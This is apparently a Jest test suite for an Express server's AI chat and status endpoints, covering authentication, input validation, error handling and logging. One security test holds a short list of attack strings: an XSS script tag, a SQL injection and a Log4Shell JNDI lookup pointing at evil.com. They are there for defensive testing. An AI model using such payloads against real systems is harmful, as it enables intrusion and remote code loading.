import request from 'supertest';
import express from 'express';
import { registerAIRoutes } from '../routes/aiRoutes';
import { resetAllMocks } from './setup/mocks';
import { Readable } from 'stream';

// Import and apply mocks
import './setup/mocks';

// Mock the AI SDK
const mockStreamText = jest.fn();
const mockConvertToCoreMessages = jest.fn();
const mockPipeDataStreamToResponse = jest.fn();

jest.mock('ai', () => ({
  streamText: (...args: any[]) => (mockStreamText as any)(...args),
  convertToCoreMessages: (...args: any[]) => (mockConvertToCoreMessages as any)(...args),
  tool: (...spec: any[]) => ({ __mockTool: true, spec })
}));

// Mock the OpenAI SDK (avoid hoist init ordering)
const mockOpenAI = jest.fn();
jest.mock('@ai-sdk/openai', () => ({
  openai: (...args: any[]) => (mockOpenAI as any)(...args)
}));

describe('AI Routes', () => {
  let app: express.Express;
  let originalEnv: Record<string, string | undefined>;

  beforeAll(async () => {
    app = express();
    app.use(express.json({ limit: '10mb' }));
    
    // Register the AI routes
    await registerAIRoutes(app);
  });

  beforeEach(() => {
    resetAllMocks();
    
    // Store original environment (copy)
    originalEnv = { ...process.env };
    
    // Setup default environment variables
    process.env.OPENAI_API_KEY = 'sk-test123';
    
    // Setup default AI SDK mocks
    mockConvertToCoreMessages.mockImplementation((messages) => messages);
    mockOpenAI.mockReturnValue('gpt-4o-mini');
    
    // Mock streamText result with pipeDataStreamToResponse method
    const mockResult = {
      pipeDataStreamToResponse: mockPipeDataStreamToResponse
    };
    mockStreamText.mockReturnValue(mockResult);
    mockPipeDataStreamToResponse.mockImplementation((res) => {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.write('data: {"content":"Hello"}\n\n');
      res.write('data: {"content":" World"}\n\n');
      res.end();
    });
  });

  afterEach(() => {
    try {
      const desc = Object.getOwnPropertyDescriptor(process, 'env');
      if (!desc || 'value' in desc) {
        // Replace env object contents
        for (const k of Object.keys(process.env)) {
          delete (process.env as any)[k];
        }
        Object.assign(process.env, originalEnv);
      } else {
        // Redefine to a value descriptor with the original copy
        Object.defineProperty(process, 'env', {
          value: { ...originalEnv },
          writable: false,
          configurable: true
        });
      }
    } catch {}
    jest.clearAllMocks();
  });

  describe('POST /api/ai/chat', () => {
    describe('Successful Requests', () => {
      it('should handle valid chat requests with streaming response', async () => {
        const messages = [
          { role: 'user', content: 'Hello, AI!' }
        ];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(200);

        expect(mockConvertToCoreMessages).toHaveBeenCalledWith(messages);
        expect(mockStreamText).toHaveBeenCalledWith(expect.objectContaining({
          model: 'gpt-4o-mini',
          messages: messages
        }));
        expect(mockPipeDataStreamToResponse).toHaveBeenCalled();
      });

      it('should convert messages to core format', async () => {
        const messages = [
          { role: 'user', content: 'Test message' },
          { role: 'assistant', content: 'Test response' }
        ];

        await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(200);

        expect(mockConvertToCoreMessages).toHaveBeenCalledWith(messages);
      });

      it('should use correct OpenAI model configuration', async () => {
        const messages = [{ role: 'user', content: 'Test' }];

        await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(200);

        expect(mockOpenAI).toHaveBeenCalledWith('gpt-4o-mini');
        expect(mockStreamText).toHaveBeenCalledWith(expect.objectContaining({
          model: 'gpt-4o-mini',
          messages: messages
        }));
      });

      it('should handle empty message arrays', async () => {
        const messages: any[] = [];

        await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(200);

        expect(mockConvertToCoreMessages).toHaveBeenCalledWith(messages);
      });

      it('should handle messages with special characters', async () => {
        const messages = [
          { role: 'user', content: 'Hello! 🌟 How are you? Testing "quotes" and symbols: @#$%' }
        ];

        await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(200);

        expect(mockConvertToCoreMessages).toHaveBeenCalledWith(messages);
      });

      it('should reject message content exceeding limits', async () => {
        const largeContent = 'x'.repeat(10000); // exceeds 8000 char limit
        const messages = [
          { role: 'user', content: largeContent }
        ];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(400);

        expect(response.body.error).toBe('Validation failed');
      });
    });

    describe('Authentication & Authorization', () => {
      it('should reject requests without authentication', async () => {
        const messages = [{ role: 'user', content: 'Test' }];

        const response = await request(app)
          .post('/api/ai/chat')
          .send({ messages })
          .expect(401);

        expect(response.body).toEqual({
          error: 'Authentication required',
          code: 'auth/no-token'
        });
        expect(mockStreamText).not.toHaveBeenCalled();
      });

      it('should reject requests with invalid tokens', async () => {
        const { getAuth } = require('firebase-admin/auth');
        const mockAuth = getAuth();
        
        const authError = new Error('Invalid token');
        (authError as any).code = 'auth/invalid-id-token';
        mockAuth.verifyIdToken.mockRejectedValue(authError);

        const messages = [{ role: 'user', content: 'Test' }];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer invalid_token')
          .send({ messages })
          .expect(401);

        expect(response.body).toEqual({
          error: 'Invalid authentication token',
          code: 'auth/invalid-token'
        });
        expect(mockStreamText).not.toHaveBeenCalled();
      });

      it('should reject requests with expired tokens', async () => {
        const { getAuth } = require('firebase-admin/auth');
        const mockAuth = getAuth();
        
        const expiredError = new Error('Token expired');
        (expiredError as any).code = 'auth/id-token-expired';
        mockAuth.verifyIdToken.mockRejectedValue(expiredError);

        const messages = [{ role: 'user', content: 'Test' }];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer expired_token')
          .send({ messages })
          .expect(401);

        expect(response.body).toEqual({
          error: 'Authentication token has expired',
          code: 'auth/expired-token'
        });
      });
    });

    describe('Configuration & Environment', () => {
      it('should return 500 when OPENAI_API_KEY is missing', async () => {
        delete process.env.OPENAI_API_KEY;

        const messages = [{ role: 'user', content: 'Test' }];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(500);

        expect(response.body).toEqual({
          error: 'AI service not configured. Please add OPENAI_API_KEY to your environment variables.'
        });
        expect(mockStreamText).not.toHaveBeenCalled();
      });

      it('should return 500 when OPENAI_API_KEY is empty', async () => {
        process.env.OPENAI_API_KEY = '';

        const messages = [{ role: 'user', content: 'Test' }];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(500);

        expect(response.body).toEqual({
          error: 'AI service not configured. Please add OPENAI_API_KEY to your environment variables.'
        });
      });

      it('should work with different OPENAI_API_KEY formats', async () => {
        const apiKeys = [
          'sk-proj-abc123',
          'sk-abc123def456',
          'sk-test_key_with_underscores'
        ];

        for (const apiKey of apiKeys) {
          process.env.OPENAI_API_KEY = apiKey;
          
          const messages = [{ role: 'user', content: 'Test' }];

          await request(app)
            .post('/api/ai/chat')
            .set('Authorization', 'Bearer valid_token')
            .send({ messages })
            .expect(200);

          expect(mockStreamText).toHaveBeenCalled();
          mockStreamText.mockClear();
        }
      });
    });

    describe('Request Validation', () => {
      it('should reject missing messages field', async () => {
        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({})
          .expect(400);

        expect(response.body.error).toBe('Validation failed');
      });

      it('should reject null messages', async () => {
        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages: null })
          .expect(400);

        expect(response.body.error).toBe('Validation failed');
      });

      it('should handle malformed JSON', async () => {
        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .set('Content-Type', 'application/json')
          .send('{ invalid json }')
          .expect(400);
      });

      it('should reject non-array messages', async () => {
        const messages = 'not an array';

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(400);

        expect(response.body.error).toBe('Validation failed');
      });

      it('should reject messages with invalid structure', async () => {
        const messages = [
          { role: 'user' }, // missing content
          { content: 'test' }, // missing role
          { role: 'invalid', content: 'test' } // invalid role
        ];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(400);

        expect(response.body.error).toBe('Validation failed');
      });
    });

    describe('AI Service Error Handling', () => {
      it('should handle AI SDK streamText errors', async () => {
        const aiError = new Error('OpenAI API error');
        mockStreamText.mockRejectedValue(aiError);

        const messages = [{ role: 'user', content: 'Test' }];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(500);

        expect(response.body).toEqual({
          error: 'AI service temporarily unavailable'
        });
      });

      it('should handle streaming errors during response', async () => {
        mockPipeDataStreamToResponse.mockImplementation((res) => {
          throw new Error('Streaming error');
        });

        const messages = [{ role: 'user', content: 'Test' }];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(500);

        expect(response.body).toEqual({
          error: 'AI service temporarily unavailable'
        });
      });

      it('should handle OpenAI rate limit errors', async () => {
        const rateLimitError: any = new Error('Rate limit exceeded');
        rateLimitError.name = 'RateLimitError';
        rateLimitError.status = 429;
        mockStreamText.mockRejectedValue(rateLimitError);

        const messages = [{ role: 'user', content: 'Test' }];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(500);

        expect(response.body).toEqual({
          error: 'AI service temporarily unavailable'
        });
      });

      it('should handle OpenAI service unavailable errors', async () => {
        const serviceError: any = new Error('Service unavailable');
        serviceError.status = 503;
        mockStreamText.mockRejectedValue(serviceError);

        const messages = [{ role: 'user', content: 'Test' }];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(500);

        expect(response.body).toEqual({
          error: 'AI service temporarily unavailable'
        });
      });

      it('should handle network timeout errors', async () => {
        const timeoutError = new Error('Network timeout');
        (timeoutError as any).code = 'ETIMEDOUT';
        mockStreamText.mockRejectedValue(timeoutError);

        const messages = [{ role: 'user', content: 'Test' }];

        const response = await request(app)
          .post('/api/ai/chat')
          .set('Authorization', 'Bearer valid_token')
          .send({ messages })
          .expect(500);

        expect(response.body).toEqual({
          error: 'AI service temporarily unavailable'
        });
      });
    });

    describe('Concurrency & Performance', () => {
      it('should handle concurrent chat requests', async () => {
        const messages = [{ role: 'user', content: 'Concurrent test' }];
        
        const concurrentRequests = Array.from({ length: 5 }, (_, i) =>
          request(app)
            .post('/api/ai/chat')
            .set('Authorization', `Bearer valid_token_${i}`)
            .send({ messages })
        );

        const responses = await Promise.all(concurrentRequests);
        
        responses.forEach(response => {
          expect(response.status).toBe(200);
        });

        expect(mockStreamText).toHaveBeenCalledTimes(5);
      });

      it('should handle rapid sequential requests', async () => {
        const messages = [{ role: 'user', content: 'Sequential test' }];
        
        for (let i = 0; i < 3; i++) {
          await request(app)
            .post('/api/ai/chat')
            .set('Authorization', `Bearer token_${i}`)
            .send({ messages })
            .expect(200);
        }

        expect(mockStreamText).toHaveBeenCalledTimes(3);
      });
    });
  });

  describe('GET /api/ai/status', () => {
    describe('Service Configuration Status', () => {
      it('should return ready status when OPENAI_API_KEY is configured', async () => {
        process.env.OPENAI_API_KEY = 'sk-test123';

        const response = await request(app)
          .get('/api/ai/status')
          .set('Authorization', 'Bearer valid_token')
          .expect(200);

        expect(response.body).toEqual({
          status: 'ready',
          message: 'AI service is ready'
        });
      });

      it('should return not_configured status when OPENAI_API_KEY is missing', async () => {
        delete process.env.OPENAI_API_KEY;

        const response = await request(app)
          .get('/api/ai/status')
          .set('Authorization', 'Bearer valid_token')
          .expect(200);

        expect(response.body).toEqual({
          status: 'not_configured',
          message: 'OpenAI API key not configured'
        });
      });

      it('should return not_configured status when OPENAI_API_KEY is empty', async () => {
        process.env.OPENAI_API_KEY = '';

        const response = await request(app)
          .get('/api/ai/status')
          .set('Authorization', 'Bearer valid_token')
          .expect(200);

        expect(response.body).toEqual({
          status: 'not_configured',
          message: 'OpenAI API key not configured'
        });
      });

      it('should return not_configured status when OPENAI_API_KEY is whitespace only', async () => {
        process.env.OPENAI_API_KEY = '   ';

        const response = await request(app)
          .get('/api/ai/status')
          .set('Authorization', 'Bearer valid_token')
          .expect(200);

        expect(response.body).toEqual({
          status: 'not_configured',
          message: 'OpenAI API key not configured'
        });
      });

      it('should return ready status for various valid API key formats', async () => {
        const validKeys = [
          'sk-abc123',
          'sk-proj-def456',
          'sk-test_key_123',
          'sk-' + 'x'.repeat(48) // Standard OpenAI key length
        ];

        for (const key of validKeys) {
          process.env.OPENAI_API_KEY = key;

          const response = await request(app)
            .get('/api/ai/status')
            .set('Authorization', 'Bearer valid_token')
            .expect(200);

          expect(response.body.status).toBe('ready');
        }
      });
    });

    describe('Authentication & Authorization', () => {
      it('should require authentication', async () => {
        const response = await request(app)
          .get('/api/ai/status')
          .expect(401);

        expect(response.body).toEqual({
          error: 'Authentication required',
          code: 'auth/no-token'
        });
      });

      it('should reject invalid tokens', async () => {
        const { getAuth } = require('firebase-admin/auth');
        const mockAuth = getAuth();
        
        const authError = new Error('Invalid token');
        (authError as any).code = 'auth/invalid-id-token';
        mockAuth.verifyIdToken.mockRejectedValue(authError);

        const response = await request(app)
          .get('/api/ai/status')
          .set('Authorization', 'Bearer invalid_token')
          .expect(401);

        expect(response.body).toEqual({
          error: 'Invalid authentication token',
          code: 'auth/invalid-token'
        });
      });

      it('should handle expired tokens', async () => {
        const { getAuth } = require('firebase-admin/auth');
        const mockAuth = getAuth();
        
        const expiredError = new Error('Token expired');
        (expiredError as any).code = 'auth/id-token-expired';
        mockAuth.verifyIdToken.mockRejectedValue(expiredError);

        const response = await request(app)
          .get('/api/ai/status')
          .set('Authorization', 'Bearer expired_token')
          .expect(401);

        expect(response.body).toEqual({
          error: 'Authentication token has expired',
          code: 'auth/expired-token'
        });
      });
    });

    describe('Error Handling', () => {
      it('should handle internal server errors gracefully', async () => {
        // Mock a scenario where checking environment variables throws for the specific key
        const originalEnv = { ...process.env } as Record<string, string | undefined>;
        Object.defineProperty(process, 'env', {
          get: () => new Proxy(originalEnv, {
            get(target, prop: string | symbol) {
              if (prop === 'OPENAI_API_KEY') {
                throw new Error('Environment access error');
              }
              return (target as any)[prop];
            }
          }),
          configurable: true
        });

        const response = await request(app)
          .get('/api/ai/status')
          .set('Authorization', 'Bearer valid_token')
          .expect(500);

        expect(response.body).toEqual({
          error: 'Failed to check AI service status'
        });

        // Restore original environment
        Object.defineProperty(process, 'env', {
          value: originalEnv,
          configurable: true
        });
      });

      it('should handle concurrent status checks', async () => {
        const concurrentRequests = Array.from({ length: 10 }, (_, i) =>
          request(app)
            .get('/api/ai/status')
            .set('Authorization', `Bearer valid_token_${i}`)
        );

        const responses = await Promise.all(concurrentRequests);
        
        responses.forEach(response => {
          expect(response.status).toBe(200);
          expect(response.body.status).toBe('ready');
        });
      });
    });
  });

  describe('Security & Input Validation', () => {
    it('should not expose API key in error messages', async () => {
      process.env.OPENAI_API_KEY = 'sk-secret123';
      
      const aiError = new Error('Invalid API key: sk-secret123');
      mockStreamText.mockRejectedValue(aiError);

      const messages = [{ role: 'user', content: 'Test' }];

      const response = await request(app)
        .post('/api/ai/chat')
        .set('Authorization', 'Bearer valid_token')
        .send({ messages })
        .expect(500);

      expect(response.body.error).not.toContain('sk-secret123');
      expect(response.body.error).toBe('AI service temporarily unavailable');
    });

    it('should handle malicious input in messages', async () => {
      const maliciousMessages = [
        { role: 'user', content: '<script>alert("xss")</script>' },
        { role: 'user', content: '"; DROP TABLE users; --' },
        { role: 'user', content: '${jndi:ldap://evil.com/a}' }
      ];

      await request(app)
        .post('/api/ai/chat')
        .set('Authorization', 'Bearer valid_token')
        .send({ messages: maliciousMessages })
        .expect(200);

      expect(mockConvertToCoreMessages).toHaveBeenCalledWith(maliciousMessages);
    });

    it('should reject extremely large payloads', async () => {
      const hugeContent = 'x'.repeat(1000000); // 1MB of content
      const messages = [{ role: 'user', content: hugeContent }];

      const response = await request(app)
        .post('/api/ai/chat')
        .set('Authorization', 'Bearer valid_token')
        .send({ messages })
        .expect(400);

      expect(response.body.error).toBe('Validation failed');
    });
  });

  describe('Logging & Monitoring', () => {
    let consoleSpy: jest.SpyInstance;

    beforeEach(() => {
      consoleSpy = jest.spyOn(console, 'log').mockImplementation();
    });

    afterEach(() => {
      consoleSpy.mockRestore();
    });

    it('should log chat requests', async () => {
      const messages = [{ role: 'user', content: 'Test logging' }];

      await request(app)
        .post('/api/ai/chat')
        .set('Authorization', 'Bearer valid_token')
        .send({ messages })
        .expect(200);

      expect(consoleSpy).toHaveBeenCalledWith('AI chat request received');
      expect(consoleSpy).toHaveBeenCalledWith('Starting OpenAI stream...');
      expect(consoleSpy).toHaveBeenCalledWith('Piping data stream to response...');
    });

    it('should log errors without sensitive information', async () => {
      const errorSpy = jest.spyOn(console, 'error').mockImplementation();
      
      const aiError = new Error('API key invalid: sk-secret123');
      mockStreamText.mockRejectedValue(aiError);

      const messages = [{ role: 'user', content: 'Test' }];

      await request(app)
        .post('/api/ai/chat')
        .set('Authorization', 'Bearer valid_token')
        .send({ messages })
        .expect(500);

      expect(errorSpy).toHaveBeenCalledWith('AI chat error:', aiError);
      
      errorSpy.mockRestore();
    });
  });
});
